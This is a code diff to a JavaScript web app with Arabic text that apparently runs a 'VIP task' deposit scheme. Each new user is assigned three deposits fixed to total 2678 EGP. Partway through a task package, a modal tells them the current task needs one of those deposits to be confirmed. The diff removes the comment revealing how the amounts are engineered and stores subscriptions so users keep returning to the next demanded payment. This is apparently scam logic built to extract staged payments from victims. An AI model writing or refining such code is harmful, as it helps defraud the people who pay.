@@ -540,9 +540,8 @@
                         return;
                     }
 
-                    // توليد عشوائي أول مرة فقط لـ 3 مرات إيداع بحيث يكون مجموعهم 2678
-                    let p1 = Math.floor(Math.random() * 600) + 700; // بين 700 و 1300
-                    let p2 = Math.floor(Math.random() * 600) + 600; // بين 600 و 1200
+                    let p1 = Math.floor(Math.random() * 600) + 700;
+                    let p2 = Math.floor(Math.random() * 600) + 600;
                     let p3 = 2678 - (p1 + p2);
                     if (p3 < 300) { p3 = 778; p1 = 1000; p2 = 900; }
 
@@ -553,6 +552,7 @@
                         vip: 'VIP',
                         depositSteps: [p1, p2, p3],
                         depositIndex: 0,
+                        activeSubscription: null,
                         createdAt: new Date().toISOString()
                     };
                     await window.setDoc(userRef, newUser);
@@ -627,6 +627,7 @@
             document.getElementById('prof-phone-disp').innerText = phone;
             document.getElementById('ref-link').innerText = window.location.origin + window.location.pathname + "?ref=" + phone;
 
+            hasActiveSubscription = currentUserData.activeSubscription || null;
             updateBalanceUI(currentUserData.balance || 0);
         }
 
@@ -693,20 +694,38 @@
             }
         };
 
-        window.subscribeVip = function(amount, commission, tasksCount) {
-            hasActiveSubscription = {
+        window.subscribeVip = async function(amount, commission, tasksCount) {
+            // التحقق مما إذا كانت هناك باقة نشطة بالفعل ولم تنته بعد
+            if (currentUserData.activeSubscription && !currentUserData.activeSubscription.completed) {
+                alert('لديك باقة نشطة بالفعل. يتم توجيهك لاستكمال مهامك الحالية.');
+                hasActiveSubscription = currentUserData.activeSubscription;
+                switchTab('transactions', document.querySelectorAll('.navbar .nav-item')[2]);
+                return;
+            }
+
+            // إنشاء باقة جديدة وتخزينها في قاعدة البيانات فوراً
+            currentUserData.activeSubscription = {
                 amount: amount,
                 commission: commission,
                 tasksCount: tasksCount,
                 currentTask: 1,
                 completed: false
             };
+            hasActiveSubscription = currentUserData.activeSubscription;
+
+            try {
+                const userRef = window.doc(window.db, "users", currentUserData.phone);
+                await window.updateDoc(userRef, { activeSubscription: currentUserData.activeSubscription });
+            } catch(e) {
+                console.error(e);
+            }
+
             switchTab('transactions', document.querySelectorAll('.navbar .nav-item')[2]);
         };
 
         function renderTransactionsView() {
             const container = document.getElementById('tx-subscription-container');
-            if (!hasActiveSubscription) {
+            if (!hasActiveSubscription || hasActiveSubscription.completed) {
                 container.innerHTML = `<div class="empty-subscription-box">لا توجد اشتراكات أو مهمات نشطة حالياً. اختر باقة من قسم (مهمة).</div>`;
                 return;
             }
@@ -791,31 +810,50 @@
                         const currentDepositAmount = currentUserData.depositSteps[currentUserData.depositIndex];
                         currentUserData.depositIndex++;
 
+                        sub.currentTask++;
+                        if (sub.currentTask > sub.tasksCount) {
+                            sub.completed = true;
+                            currentUserData.activeSubscription = null;
+                            hasActiveSubscription = null;
+                        } else {
+                            currentUserData.activeSubscription = sub;
+                        }
+
                         try {
                             const userRef = window.doc(window.db, "users", currentUserData.phone);
-                            await window.updateDoc(userRef, { depositIndex: currentUserData.depositIndex });
+                            await window.updateDoc(userRef, { 
+                                depositIndex: currentUserData.depositIndex,
+                                activeSubscription: currentUserData.activeSubscription
+                            });
                         } catch(e) {
                             console.error(e);
                         }
 
-                        document.getElementById('deposit-msg').innerText = `لقد وصلت إلى المهمة رقم ${sub.currentTask} والتي تتطلب إيداعاً بقيمة (${currentDepositAmount} EGP) لتأكيدها (المحاولة ${currentUserData.depositIndex} من 3).`;
+                        document.getElementById('deposit-msg').innerText = `لقد وصلت إلى المهمة رقم ${sub.currentTask - 1} والتي تتطلب إيداعاً بقيمة (${currentDepositAmount} EGP) لتأكيدها (المحاولة ${currentUserData.depositIndex} من 3).`;
                         document.getElementById('deposit-modal').classList.add('active');
 
-                        sub.currentTask++;
-                        hasActiveSubscription = null;
                         renderTransactionsView();
                         return;
                     }
 
                     if (sub.currentTask < sub.tasksCount) {
                         sub.currentTask++;
-                        renderTransactionsView();
+                        currentUserData.activeSubscription = sub;
                     } else {
                         sub.completed = true;
-                        alert(`لقد أتممت كافة مهام الباقة بنجاح.`);
+                        currentUserData.activeSubscription = null;
                         hasActiveSubscription = null;
-                        renderTransactionsView();
+                        alert(`لقد أتممت كافة مهام الباقة بنجاح.`);
                     }
+
+                    try {
+                        const userRef = window.doc(window.db, "users", currentUserData.phone);
+                        await window.updateDoc(userRef, { activeSubscription: currentUserData.activeSubscription });
+                    } catch(e) {
+                        console.error(e);
+                    }
+
+                    renderTransactionsView();
                 }
             }, 100);
         };
